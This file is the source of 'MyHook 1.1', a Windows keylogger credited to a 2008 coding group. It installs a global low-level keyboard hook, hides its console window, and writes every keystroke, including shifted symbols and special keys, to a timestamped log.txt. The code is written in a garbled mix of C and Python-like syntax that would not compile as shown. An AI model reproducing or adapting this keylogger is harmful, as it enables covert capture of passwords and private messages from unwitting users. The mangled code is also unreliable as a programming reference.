/*
    MyHook 1.1
    Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
    Created for Major League Coding
    http://groups.myspace.com/MajorLeagueCoding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <time.h>

void fcatch(char* data)
void hideMe(void)
void startLog(void)
void hookIt(void)

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)


int main(int argc, char const *argv[]):
    hideMe()
    startLog()
    hookIt()
    return 0


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam):
    // Declare pointer to the KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam
    switch:
        wParam
    case WM_KEYUP: // When the key has been pressed and released
        // Assign keyboard code to local variable
        DWORD vkCode = pKeyBoard->vkCode

        if vkCode >= 0x27 && vkCode < 'A': // Keys 0-9
            if GetAsyncKeyState(VK_SHIFT): // Check if shift key is down (fairly accurate)
                // ")!@#$%^&*("
                switch:
                    vkCode // 0x30-0x39 is 0-9 respectively
                case 0x30:
                    fcatch(")")
                case 0x31:
                    fcatch("!")
                case 0x32:
                    fcatch("@")
                case 0x33:
                    fcatch("#")
                case 0x34:
                    fcatch("$")
                case 0x35:
                    fcatch("%")
                case 0x36:
                    fcatch("^")
                case 0x37:
                    fcatch("&")
                case 0x38:
                    fcatch("*")
                case 0x39:
                    fcatch("(")
            else: // If shift key is not down
                char val[5]
                sprintf(val,"%c",vkCode)
                fcatch(val)
        elif 'A' <= vkCode && vkCode <= 'Z': // Keys a-z
            if !GetAsyncKeyState(VK_SHIFT): // If the shift key is not down, un-capitalize letters
                vkCode += 'a' - 'A'
            char val[5]
            sprintf(val, "%c", vkCode)
            fcatch(val)
        else: // Check for other keys
            switch:
                vkCode
            case VK_SPACE:
                fcatch(" ")
            case VK_RETURN:
                fcatch("[ENTER]\n")
            case VK_BACK:
                fcatch("[BKSP]")
            case VK_DELETE:
                fcatch("[DEL]")
            case VK_TAB:
                fcatch("[TAB]")
            case VK_INSERT:
                fcatch("[INSERT]")
            case VK_CAPITAL:
                fcatch("[CAPS]")
            case VK_ESCAPE:
                fcatch("[ESC]")
            case VK_LCONTROL, VK_RCONTROL:
                fcatch("[CTRL]")
            case VK_LSHIFT, VK_RSHIFT:
                pass
            case VK_LMENU, VK_RMENU:
                fcatch("[ALT]")
            case VK_NUMPAD0:
                fcatch("0")
            case VK_NUMPAD1:
                fcatch("1")
            case VK_NUMPAD2:
                fcatch("2")
            case VK_NUMPAD3:
                fcatch("3")
            case VK_NUMPAD4:
                fcatch("4")
            case VK_NUMPAD5:
                fcatch("5")
            case VK_NUMPAD6:
                fcatch("6")
            case VK_NUMPAD7:
                fcatch("7")
            case VK_NUMPAD8:
                fcatch("8")
            case VK_NUMPAD9:
                fcatch("9")
            case VK_OEM_2:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("?")
                else:
                    fcatch("/")
            case VK_OEM_3:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("~")
                else:
                    fcatch("`")
            case VK_OEM_4:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("{")
                else:
                    fcatch("[")
            case VK_OEM_5:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("|")
                else:
                    fcatch("\\")
            case VK_OEM_6:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("}")
                else:
                    fcatch("]")
            case VK_OEM_7:
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("\"")
                else:
                    fcatch("'")
            case 0xBC: // comma
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("<")
                else:
                    fcatch(",")
            case 0xBE: // Period
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch(">")
                else:
                    fcatch(".")
            case 0xBA: // Semi Colon same as VK_OEM_1
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch(":")
                else:
                    fcatch(";")
            case 0xBD: // Minus
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("_")
                else:
                    fcatch("-")
            case 0xBB: // Equal
                if GetAsyncKeyState(VK_SHIFT):
                    fcatch("+")
                else:
                    fcatch("=")
            default: // Catch all misc keys
                // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys

                //  Use Getnametext instead of a lot of switch statements for system keys.

                DWORD dwMsg = 1
                dwMsg += pKeyBoard->scanCode << 16
                dwMsg += pKeyBoard->flags << 24

                char key[16]
                GetKeyNameTextA(dwMsg, key, 15)
                fcatch(key)
    default:
        return CallNextHookEx(NULL, nCode, wParam, lParam)
    return 0

// Declare function to catch data and do whatever with it
void fcatch(char* data):
    FILE *file
    file=fopen("log.txt", "a+")
    fputs(data,file)
    fclose(file)

// NEW - Hide function. Removed AllocConsole()
void hideMe(void):
     HWND stealth = FindWindowA("ConsoleWindowClass", NULL)
     ShowWindow(stealth, SW_HIDE)

// NEW - New log function. Added the get current time call into function

void startLog(void):
    time_t ltime;
    ltime = time(NULL)
    fcatch("\n\n------------------------------------------------------------------------")
    fcatch("\n\t\t\tMyHook Session\t")
    fcatch(asctime(localtime(&ltime))) // Add timestamp to log file
    fcatch("------------------------------------------------------------------------\n")


void hookIt(void):
    // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL)

    // Set a global Windows Hook to capture keystrokes.
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0)

    MSG msg
    while GetMessage(&msg, NULL, 0, 0) > 0:
        TranslateMessage(&msg)
        DispatchMessage(&msg)
